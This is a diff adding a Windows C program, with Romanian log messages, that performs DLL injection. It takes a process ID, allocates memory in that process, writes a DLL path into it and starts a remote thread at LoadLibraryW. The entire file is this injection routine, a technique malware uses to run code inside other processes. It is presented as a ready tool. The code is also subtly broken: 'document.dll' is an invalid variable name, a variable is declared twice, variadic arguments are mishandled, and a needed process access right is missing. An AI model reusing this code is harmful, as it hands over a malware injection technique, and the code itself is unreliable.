@@ -1,0 +1,94 @@
+#include <Windows.h>
+#include <stdio.h>
+void displayMessage(const char* prefix, const char* msg, ...) {
+       va_list args;
+       va_start(args, msg);
+       printf("[%s] ", prefix);
+       vprintf(msg, args);
+       printf("\n");
+       va_end(args);
+}
+void new_1(const char* msg, ...) {
+       va_list args;
+       va_start(args, msg);
+       displayMessage("i", msg, args);
+       va_end(args);
+}
+void new_2(const char* msg, ...) {
+       va_list args;
+       va_start(args, msg);
+       displayMessage("-", msg, args);
+       va_end(args);
+}
+void new_3(const char* msg, ...) {
+       va_list args;
+       va_start(args, msg);
+       displayMessage("+", msg, args);
+       va_end(args);
+}
+int main(int argc, char* argv[]) {
+     DWORD PID = 0, TID = 0;
+     LPVOID rBuffer = NULL;
+     HANDLE hProcess = NULL, hThread = NULL;
+     HMODULE hK32  = NULL;
+     wchar_t document.dll[MAX_PATH] = L"C:\\ … \\ … \\document.dll";
+     size_t pathSize = sizeof(document.dll);
+     size_t bytesWritten = 0;
+     if (argc < 2 || (PID = atoi(argv[1])) <= 0) {
+          new_2("utilizare: %s <PID>", argv[0]);
+          return EXIT_FAILURE;
+     }
+     new_1("încercând să abordeze procesul (%ld)", PID);
+     if ((hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID)) == NULL) {
+           new_2("incapabil să se ocupe de proces (%ld), eroare: 0x%lx", PID, GetLastError());
+           return EXIT_FAILURE;
+     }
+     new_3("a primit o pârghie la proces");
+     new_1("\\[ hProcess\n\t\\_0x%p]\n", hProcess);
+     new_1("a primit o pârghie către Kernel32.dll");
+     if ((hK32  = GetModuleHandleW(L"kernel32")) == NULL) {
+          new_2("nu a reușit să obțină o pârghie către Kernel32.dll, eroare: 0x%lx", GetLastError());
+          CloseHandle(hProcess);
+          return EXIT_FAILURE;
+     }
+     new_3("s-a obținut o pârghie către Kernel32.dll");
+     new_1("\\[ hK32 \n\t\\_0x%p]\n", hK32 );
+     new_1("obtinerea adresei de LoadLibraryW()");
+     LPTHREAD_START_ROUTINE kawLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32 , "LoadLibraryW");
+     new_3("s-a obținut adresa de LoadLibraryW()");
+     new_1("\\[ LoadLibraryW\n\t\\_0x%p]\n", kawLoadLibrary);
+     new_1("alocarea memoriei în procesul țintă");
+     if ((rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(L"C:\\ … \\ … \\document.dll"), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) == NULL) {
+            new_2("nu a putut aloca un buffer memoriei procesului țintă, eroare: 0x%lx", GetLastError());
+            goto CLEANUP;
+     }
+     new_3("buffer alocat în memoria procesului țintă (PAGE_READWRITE)");
+     new_1("scriere în buffer-ul alocat");
+     size_t bytesWritten = 0;
+     if (!WriteProcessMemory(hProcess, rBuffer, L"C:\\ … \\ … \\document.dll", sizeof(L"C:\\ … \\ … \\document.dll"), &bytesWritten)) {
+          new_2("nu s-a putut scrie în memoria procesului, eroare: 0x%lx", GetLastError());
+          goto CLEANUP;
+     }    
+     new_3("a scris %zu-bytes la memoria procesului", bytesWritten);
+     new_1("crearea unei secvențe");
+     if ((hThread = CreateRemoteThread(hProcess, NULL, 0, kawLoadLibrary, rBuffer, 0, &TID)) == NULL) {
+           new_2("nu se poate crea o secvență, eroare: 0x%lx", GetLastError());
+           goto CLEANUP;
+     }
+     new_3("s-a creat o secvență nouă în procesul țintă (%ld)", TID);
+     new_1("\\___[ hThread\n\t\\_0x%p]\n", hThread);
+     new_1("se așteaptă terminarea secvenței");
+     WaitForSingleObject(hThread, INFINITE);
+     new_3("secvența de execuție s-a finalizat");
+CLEANUP:
+     if (hThread) {
+          new_1("se închide pârghia secvenței");
+          CloseHandle(hThread);
+     }
+     if (hProcess) {
+          new_1("se închide pârghia procesului");
+          CloseHandle(hProcess);
+     }
+     new_3("terminat");
+     return EXIT_SUCCESS;
+}
